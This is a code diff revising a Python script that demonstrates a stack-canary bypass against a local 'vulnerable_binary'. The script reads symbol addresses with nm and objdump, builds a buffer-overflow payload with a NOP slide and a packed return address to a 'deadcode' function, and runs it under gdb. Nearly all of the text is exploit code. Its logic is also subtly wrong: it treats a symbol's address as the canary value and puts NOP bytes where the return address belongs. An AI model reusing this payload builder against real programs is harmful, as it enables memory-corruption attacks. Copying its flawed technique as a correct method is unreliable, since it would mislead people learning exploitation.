@@ -6,7 +6,6 @@ import re
 BINARY_PATH = "./vulnerable_binary"
 
 def analyze_binary(binary_path):
-    """Analyze the binary to extract memory layout information using nm and objdump."""
     try:
         nm_output = subprocess.check_output(['nm', binary_path]).decode()
         objdump_output = subprocess.check_output(['objdump', '-d', binary_path]).decode()
@@ -15,20 +14,34 @@ def analyze_binary(binary_path):
         buffer_address = re.search(r'(\w+) <vulnerable_function>:', objdump_output)
         deadcode_address = re.search(r'(\w+) <deadcode>:', objdump_output)
 
-        return canary_address.group(1), buffer_address.group(1), deadcode_address.group(1)
+        if canary_address and buffer_address and deadcode_address:
+            return int(canary_address.group(1),16), int(buffer_address.group(1),16), int(deadcode_address.group(1),16)
+        else:
+            raise ValueError("Could not find all necessary addresses (canary, buffer, deadcode).")
     except subprocess.CalledProcessError as e:
         print(f"Failed to analyze binary: {e}")
         exit(1)  #if binary cannot be analyzed
+    except ValueError as e:
+        print(f"Error processing Address: {e}")
+        exit(1)
 
-def create_dynamic_payload(canary, deadcode_address):
-    """Create a dynamic payload to jump to deadcode, bypassing the canary."""
+def create_payload(canary, deadcode_address):
     buffer_size = 64
     nop_slide = b"\x90" * 16
-    payload = b"A" * buffer_size
-    payload += struct.pack("<I", canary))  # preserving the canary
-    payload += nop_slide
-    payload += struct.pack("<I", (deadcode_address)  # jumping to return address
-    return payload
+    try:
+         # Convert hex string to integer if necessary
+        if isinstance(canary, str):
+            canary = int(canary, 16)
+        if isinstance(deadcode_address, str):
+            deadcode_address = int(deadcode_address, 16)
+        payload = b"A" * buffer_size
+        payload += struct.pack("<I", canary)  # preserving the canary
+        payload += nop_slide
+        payload += struct.pack("<I", deadcode_address)  # jumping to return address
+        return payload
+    except ValueError as e:
+        print(f"Error in payload creation: {e}")
+        raise
 
 def gdb_auto_run(binary_path, payload):
     """Automatically run gdb with the given payload."""
@@ -59,8 +72,9 @@ def gdb_auto_run(binary_path, payload):
 def main():
     print("Starting Stack Canary Bypass demonstration...")
     try:
-        canary, _, deadcode_address = analyze_binary(BINARY_PATH)
-        payload = create_dynamic_payload(canary, deadcode_address)
+        canary, buffer_addr, deadcode_addr = analyze_binary(BINARY_PATH)
+        payload = create_payload(canary, deadcode_addr)
+        print(f"Extracted Addresses: Canary at {hex(canary)}, Buffer at {hex(buffer_addr)}, Deadcode at {hex(deadcode_addr)}")
         gdb_auto_run(BINARY_PATH, payload)
         print("Exploit attempt completed. Check GDB output for details.")
     except Exception as e:
